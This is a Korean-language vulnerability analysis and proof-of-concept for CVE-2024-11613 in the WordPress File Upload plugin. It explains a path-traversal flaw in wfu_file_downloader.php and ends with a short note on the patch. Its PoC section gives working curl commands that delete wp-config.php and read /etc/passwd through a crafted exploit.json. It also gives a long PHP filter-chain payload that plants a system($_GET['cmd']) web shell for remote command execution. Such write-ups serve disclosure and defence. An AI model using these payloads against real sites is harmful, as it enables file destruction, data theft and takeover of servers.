# CVE-2024-11613

## Index
* [📌 Analysis](#📌-analysis)
    * [1. 개요](#1-개요)
    * [2. 취약점 분석](#2-취약점-분석)
    * [3. 임의 파일 삭제 취약점](#3-임의-파일-삭제-취약점)
    * [4. 임의 파일 읽기 취약점](#4-임의-파일-읽기-취약점)
    * [5. RCE(원격 코드 실행) 취약점](#5-RCE원격-코드-실행-취약점)
* [📌 PoC](#📌-poc)
    * [1. 임의 파일 삭제 취약점](#1-임의-파일-삭제-취약점)
    * [2. 임의 파일 읽기 취약점](#2-임의-파일-읽기-취약점)
    * [3. RCE(원격 코드 실행) 취약점](#3-RCE원격-코드-실행-취약점)
* [📌 패치 확인](#-패치-확인)

## 📌 Analysis

### 1. 개요

`CVE-2024-11613` 취약점은 워드프레스 플러그인 WordPress File Upload 4.24.15 버전 이하에서 발생하는 RCE(Remote Code Execution) 취약점 입니다. 해당 취약점은 플러그인의 기능 중 파일 다운로드 기능에서 발생 되며, 사용자로 부터 입력받은 값에 대한 불충분한 이스케이프 처리로 인해 발생됩니다.

그 밖에, 처리 과정에서 부적절한 제어로 인해 임의 파일에 대한 읽기 및 삭제도 가능합니다.

### 2. 취약점 분석

해당 취약점은 Uploaded Files 대시보드 메뉴(`/wp-admin/admin.php?page=wfu_uploaded_files`)에서 파일을 다운로드 받을 때 발생합니다.

![imagea](images/image-001.png)

위 Uploaded Files 대시보드 메뉴에서 파일을 다운로드하면 아래와 같이 `/wp-content/plugins/wp-file-upload/wfu_file_downloader.php` 경로(이하, `wfu_file_downloader.php`)로 요청을 수행하며, 다운로드 받으려는 파일의 데이터를 응답 데이터로 가져옵니다.

![imagea](images/image-002.png)

이때, `wfu_file_downloader.php` 파일의 처리 로직에서 다음의 취약점이 발생합니다.

### 3. 임의 파일 삭제 취약점

파일을 다운로드하기 위해 `wfu_file_downloader.php` 를 요청하면, 다운로드 대상 파일의 정보를 변수 `$downloader_data` 에 초기화 합니다. 이때, 해당 변수의 데이터는 함수 `wfu_read_downloader_data` 의 호출 결과입니다.

![imagea](images/image-003.png)

`wfu_read_downloader_data` 함수 에서는 URL 파라미터 `source` 값을 가져와 임시 디렉터리(`/tmp`)와 결합합니다. 이후 결합된 임시 파일의 경로를 조회하여 파일이 존재할 경우 해당 임시 파일의 데이터를 변수 `$dataenc` 에 초기화 합니다.

![imagea](images/image-004.png)

임시 파일은 파일 다운로드를 요청(e.g. `wfu_file_downloader.php?source=wfuGIr5CK`)할 때, 전달된 URL 파라미터 `source` 와 임시 파일 경로(`/tmp`)를 결합한 경로로, 해당 임시 파일에는 다운로드 관련 정보들이 json 구조로 저장되어 있습니다.

![imagea](images/image-005.png)

```json
{
   "ticket":"Gk3SQjDN6EmeP1EL",
   "type":"normal",
   "filepath":"\/wp-content\/uploads\/dog.png",
   "handler":"dboption",
   "expire":1739342420,
   "wfu_ABSPATH":"\/var\/www\/html\/",
   "wfu_browser_downloadfile_notexist":"File does not exist!",
   "wfu_browser_downloadfile_failed":"Could not download file!"
}
```

그 다음 임시 파일로부터 파일 관련 정보들을 가져 왔으면, 다음 처리 과정에서 필요 없어진 임시파일을 `unlink` 함수를 통해 삭제하게됩니다.

이때, 요청 URL 파라미터 `source` 에 대한 유효성 검사를 수행하지 않아 상위 경로(`../`)를 포함한 데이터를 전달하면 해당 경로의 파일이 삭제되는 ‘임의 파일 삭제’ 취약점이 발생합니다.

![imagea](images/image-006.png)

### 4. 임의 파일 읽기 취약점

앞서 살펴본 내용을 통해 파일 다운로드 시 함수 `wfu_read_downloader_data` 를 호출하여 다운로드 받으려는 파일의 정보를 임시 파일로 부터 읽어들여 변수 `$downloader_data` 에 초기화 된다는 것을 알았습니다.

변수 `$downloader_data` 에는 다운로드 받으려는 파일의 경로를 포함하고 있습니다.

![imagea](images/image-007.png)

이를 통해, 임시 파일에 저장된 json 데이터 구조와 동일한 파일을 PHP 애플리케이션에 업로드 가능한 경우, 파일 다운로드 요청 시 전달하는 URL 파라미터 `source` 에 해당 경로를 대입하여 임의 파일의 데이터를 읽어올 수 있습니다.

예를 들어, 아래의 데이터를 가지는 파일 `exploit.json` 를 Document Root Directory(e.g. `/var/www/html`)에 저장합니다. 해당 데이터는 `/etc/passwd` 의 파일 내용을 가져오기 위한 데이터 입니다.

```json
{
    "ticket":"AAAAAAAAAAAAAAAA",
    "type":"normal",
    "filepath":"../../../../../etc/passwd",
    "handler":"dboption",
    "expire":9999999999,
    "wfu_ABSPATH":"/var/www/html/",
    "wfu_browser_downloadfile_notexist":"Not Exist",
    "wfu_browser_downloadfile_failed":"Failed"
}
```

![imagea](images/image-008.png)

위 json 데이터 중 `filepath` 의 값은 다음과 같이 `fread` 함수에 의해 읽어와 응답 데이터로 출력합니다.

![imagea](images/image-009.png)

따라서, 파일 다운로드 요청 시 URL 파라미터 `source` 에 `../var/www/html/exploit.json` 를 지정할 경우, 임시 파일 경로 `/tmp` 와 결합되어 최종적으로 `/tmp/../var/www/html/exploit.json` 을 가져오게 됩니다. 

그 다음 `exploit.json` 에 저장된 데이터 `filepath` 의 값 `/etc/passwd` 을 읽어와 다음과 같이 응답 데이터로 출력되는 것을 확인할 수 있습니다.

![imagea](images/image-010.png)

### 5. RCE(원격 코드 실행) 취약점

파일 다운로드 시 전달하는 URL 파라미터 `source` 는 다운로드 받으려는 파일의 정보를 json 구조로 저장하고 있습니다. 이 json 데이터 중 `wfu_ABSPATH` 의 값은 파일 다운로드 처리 과정에서 `require_once` 함수의 인자로 전달됩니다.

![imagea](images/image-011.png)

따라서,  앞서 살펴본 ‘임의 파일 읽기’ 취약점과 동일하게 다음의 json 데이터를 Document Root Directory에 저장(`/var/www/html/exploit.json`)합니다.

아래 데이터 중 `wfu_ABSPATH` 의 값은 웹 쉘 코드(`<?php system($_GET['cmd']);?>`)를 PHP Filter Chain 기법을 이용하여 생성한 값 입니다.

```json
 {
    "ticket":"AAAAAAAAAAAAAAAA",
    "type":"normal",
    "filepath":"../../../../../etc/passwd",
    "handler":"dboption",
    "expire":9999999999,
    "wfu_ABSPATH":"php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp",
    "wfu_browser_downloadfile_notexist":"Not Exist",
    "wfu_browser_downloadfile_failed":"Failed"
}
```

![imagea](images/image-012.png)

이후 ‘임의 파일 읽기’ 취약점과 동일한 방식으로 위 파일 경로를 URL 파라미터 `source` 로 전달하고 추가로, URL 파라미터 `cmd` 에 실행할 명령어(`ls -al`)를 전달합니다.

그럼 다음과 같이 입력한 명령어 `ls -al` 이 출력되는 것을 확인하실 수 있습니다.

![imagea](images/image-013.png)

## 📌 PoC

### 1. 임의 파일 삭제 취약점

아래의 요청은 워드프레스 기본 파일인 `wp-config.php` 를 삭제하는 스크립트입니다.

```bash
curl -G "http://localhost:8080/wp-content/plugins/wp-file-upload/wfu_file_downloader.php" \
     --data-urlencode "source=../var/www/html/wp-config.php"

curl http://localhost:8080 -v
```

위 요청을 수행한 뒤, 워드프레스 사이트를 접속하면 워드프레스 설정(`/wp-admin/setup-config.php`)로 302 Found 응답 상태와 함께 리다이렉션이 발생합니다.

![imagea](images/image-014.png)

### 2. 임의 파일 읽기 취약점

아래의 json 데이터를 PHP 애플리케이션의 Document Root Directory에 `exploit.json` 파일명으로 저장합니다. 해당 데이터는 `/etc/passwd` 경로를 읽어오기 위한 데이터로, 다른 파일을 읽으려면 `filepath` 의 경로를 수정하면 됩니다.

```json
{
    "ticket":"AAAAAAAAAAAAAAAA",
    "type":"normal",
    "filepath":"../../../../../etc/passwd",
    "handler":"dboption",
    "expire":9999999999,
    "wfu_ABSPATH":"/var/www/html/",
    "wfu_browser_downloadfile_notexist":"Not Exist",
    "wfu_browser_downloadfile_failed":"Failed"
}
```

![imagea](images/image-015.png)

그 다음 아래의 명령어를 입력하여 결과를 확인합니다.

```bash
curl -G "http://localhost:8080/wp-content/plugins/wp-file-upload/wfu_file_downloader.php" \
     --data-urlencode "source=../var/www/html/exploit.json"
```

![imagea](images/image-016.png)

### 3. RCE(원격 코드 실행) 취약점

아래의 json 데이터를 PHP 애플리케이션의 Document Root Directory에 `exploit.json` 파일명으로 저장합니다. 해당 데이터는 명령어 실행을 위한 페이로드입니다.

```json
{
    "ticket":"AAAAAAAAAAAAAAAA",
    "type":"normal",
    "filepath":"../../../../../etc/passwd",
    "handler":"dboption",
    "expire":9999999999,
    "wfu_ABSPATH":"php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp",
    "wfu_browser_downloadfile_notexist":"Not Exist",
    "wfu_browser_downloadfile_failed":"Failed"
}
```

![imagea](images/image-017.png)

이후 아래의 명령어를 입력하여 RCE가 실행되는 것을 확인합니다.

```bash
curl -G "http://localhost:8080/wp-content/plugins/wp-file-upload/wfu_file_downloader.php" \
     --data-urlencode "source=../var/www/html/exploit.json" \
     --data-urlencode "cmd=ls -al" \
     --output -

```

![imagea](images/image-018.png)

## 📌 패치 확인

패치는 파일 다운로드 요청 시 전달되는 URL 파라미터 `source` 에 대한 경로 탐색(Path Traversal)이 불가능 하도록 정규식 필터를 이용한 치환 방식(`preg_replace`)이 적용되었습니다. 따라서, 상위 경로(`../`)를 이용하여 임시 디렉터리(`/tmp`)를 벗어나지 못하도록 처리되었습니다.

> https://plugins.trac.wordpress.org/changeset/3217005/#file11
> 

![imagea](images/image-019.png)